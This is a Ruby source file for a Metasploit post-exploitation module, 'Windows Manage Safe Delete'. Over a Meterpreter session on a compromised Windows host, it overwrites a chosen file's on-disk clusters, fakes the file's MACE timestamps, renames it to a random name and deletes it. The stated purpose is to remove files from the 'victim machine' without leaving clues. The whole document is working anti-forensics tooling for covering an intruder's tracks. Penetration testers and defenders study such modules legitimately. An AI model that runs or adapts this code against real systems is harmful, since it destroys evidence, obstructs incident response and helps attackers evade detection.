##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'	=> 'Windows Manage Safe Delete',
        'Description' => %q{
          The goal of the module is to hinder the recovery of deleted files by overwriting
          its contents.  This could be useful when you need to download some file on the victim
          machine and then delete it without leaving clues about its contents. Note that the script
          does not wipe the free disk space so temporary/sparse/encrypted/compressed files could
          not be overwritten. Note too that MTF entries are not overwritten so very small files
          could stay resident within the stream descriptor.
        },
        'License' => BSD_LICENSE,
        'Author' => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              priv_fs_set_file_mace
              stdapi_fs_stat
              stdapi_railgun_api
              stdapi_sys_config_getenv
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptBool.new('ZERO', [ false, 'Zero overwrite. If set to false, random data will be used', false]),
      OptInt.new('ITERATIONS', [false, 'The number of overwrite passes', 1 ]),
      OptString.new('FILE', [true, 'File to be deleted', ''])
    ])
  end

  def run
    type = 1
    n = datastore['ITERATIONS']
    file = datastore['FILE']

    if datastore['ZERO']
      type = 0
      print_status('The file will be overwritten with null bytes')
    end

    if !file_exist?(file)
      print_error("File #{file} does not exist")
      return
    elsif comp_encr(file)
      print_status('File compress or encrypted. Content could not be overwritten!')
    end
    file_overwrite(file, type, n)
  end

  # Function to calculate the size of the cluster
  def size_cluster
    drive = session.sys.config.getenv('SystemDrive')
    r = session.railgun.kernel32.GetDiskFreeSpaceA(drive, 4, 4, 4, 4)
    cluster = r['lpBytesPerSector'] * r['lpSectorsPerCluster']
    print_status("Cluster Size: #{cluster}")

    return cluster
  end

  # Function to calculate the real file size on disk (file size + slack space)
  def size_on_disk(file)
    size_file = session.fs.file.stat(file).size
    print_status("Size of the file: #{size_file}")

    if (size_file < 800)
      print_status("The file is too small. If it's store in the MTF (NTFS) sdel will not overwrite it!")
    end

    cluster_size = size_cluster
    size_ = size_file.divmod(cluster_size)

    if size_.last != 0
      real_size = (size_.first * cluster_size) + cluster_size
    else
      real_size = size_.first * cluster_size
    end

    print_status("Size on disk: #{real_size}")
    return real_size
  end

  # Change MACE attributes. Get a fake date by subtracting N days from the current date
  def change_mace(file)
    rsec = Rex::Text.rand_text_numeric(7, '012')
    date = Time.now - rsec.to_i
    print_status('Changing MACE attributes')
    session.priv.fs.set_file_mace(file, date, date, date, date)
  end

  # Function to overwrite the file
  def file_overwrite(file, type, num)
    # FILE_FLAG_WRITE_THROUGH: Write operations will go directly to disk
    r = session.railgun.kernel32.CreateFileA(file, 'GENERIC_WRITE', 'FILE_SHARE_READ|FILE_SHARE_WRITE', nil, 'OPEN_EXISTING', 'FILE_FLAG_WRITE_THROUGH', 0)
    handle = r['return']
    real_size = size_on_disk(file)

    if type == 0
      random = "\0" * real_size
    end

    i = 0
    num.times do
      i += 1
      print_status("Iteration #{i}/#{num}:")

      if type == 1
        random = Rex::Text.rand_text(real_size, nil)
      end

      # http://msdn.microsoft.com/en-us/library/windows/desktop/aa365541(v=vs.85).aspx
      session.railgun.kernel32.SetFilePointer(handle, 0, nil, 'FILE_BEGIN')

      # http://msdn.microsoft.com/en-us/library/windows/desktop/aa365747(v=vs.85).aspx
      w = session.railgun.kernel32.WriteFile(handle, random, real_size, 4, nil)

      if w['return'] == false
        print_error('The was an error writing to disk, check permissions')
        return
      end

      print_status("#{w['lpNumberOfBytesWritten']} bytes overwritten")
    end

    session.railgun.kernel32.CloseHandle(handle)
    change_mace(file)

    # Generate a long random file name before delete it
    newname = Rex::Text.rand_text_alpha(200, nil)
    print_status('Changing file name')

    # http://msdn.microsoft.com/en-us/library/windows/desktop/aa365239(v=vs.85).aspx
    session.railgun.kernel32.MoveFileA(file, newname)

    file_rm(newname)
    print_good('File erased!')
  end

  # Check if the file is encrypted or compressed
  def comp_encr(file)
    # http://msdn.microsoft.com/en-us/library/windows/desktop/aa364944(v=vs.85).aspx
    handle = session.railgun.kernel32.GetFileAttributesA(file)
    type = handle['return']

    # FILE_ATTRIBUTE_COMPRESSED=0x800
    # FILE_ATTRIBUTE_ENCRYPTED=0x4000
    if (type & (0x4800)).nonzero?
      return true
    end

    return false
  end
end
